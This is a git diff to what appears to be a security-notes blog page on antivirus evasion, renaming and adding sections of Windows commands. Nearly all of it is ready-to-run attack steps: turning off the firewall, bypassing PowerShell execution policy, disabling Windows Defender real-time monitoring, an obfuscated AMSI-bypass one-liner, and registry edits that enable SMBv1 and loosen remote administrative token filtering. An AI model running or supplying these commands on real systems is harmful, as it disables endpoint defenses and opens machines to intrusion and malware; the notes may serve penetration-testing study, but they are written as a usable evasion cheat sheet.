@@ -11,9 +11,10 @@ permalink: /:categories/:title/
 <!-- vscode-markdown-toc -->
 * [AV Evasion 101 by S3cur3Th1sSh1t](#AVEvasion101byS3cur3Th1sSh1t)
 * [Firewall](#Firewall)
-* [Powershell](#Powershell)
-* [Windows Defender](#WindowsDefender)
-* [AMSI](#AMSI)
+* [Enabling Powershell](#EnablingPowershell)
+* [Disabling Windows Defender](#DisablingWindowsDefender)
+* [Bypassing AMSI](#BypassingAMSI)
+* [T1112 - Modify Registry](#T1112-ModifyRegistry)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -32,7 +33,7 @@ netsh advfirewall set allprofiles state off
 netsh advfirewall show allprofiles
 ```
 
-## <a name='Powershell'></a>Powershell
+## <a name='EnablingPowershell'></a>Enabling Powershell
 ```
 # powershell execution protection bypass
 powershell -ep bypass
@@ -47,16 +48,25 @@ $ExecutionContext.SessionState.LanguageMode
 $ExecutionContext.SessionState.LanguageMode ConstrainedLanguage
 ```
 
-## <a name='WindowsDefender'></a>Windows Defender
+## <a name='DisablingWindowsDefender'></a>Disabling Windows Defender
 ```powershell
 # Windows Defender disabling features
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
 Set-MpPreference -DisableIOAVProtection $true
 ```
 
-## <a name='AMSI'></a>AMSI
+## <a name='BypassingAMSI'></a>Bypassing AMSI 
 ```powershell
 # Windows Defender AMSI Bypass  
 # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
 sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
  ```
+
+## <a name='T1112-ModifyRegistry'></a>T1112 - Modify Registry
+```powershell
+# win10 tampering: PS enable SMB v1
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 1 –Force
+
+# win10 tampering: PS allow administrative shares
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name LocalAccountTokenFilterPolicy -Value 1 
+```
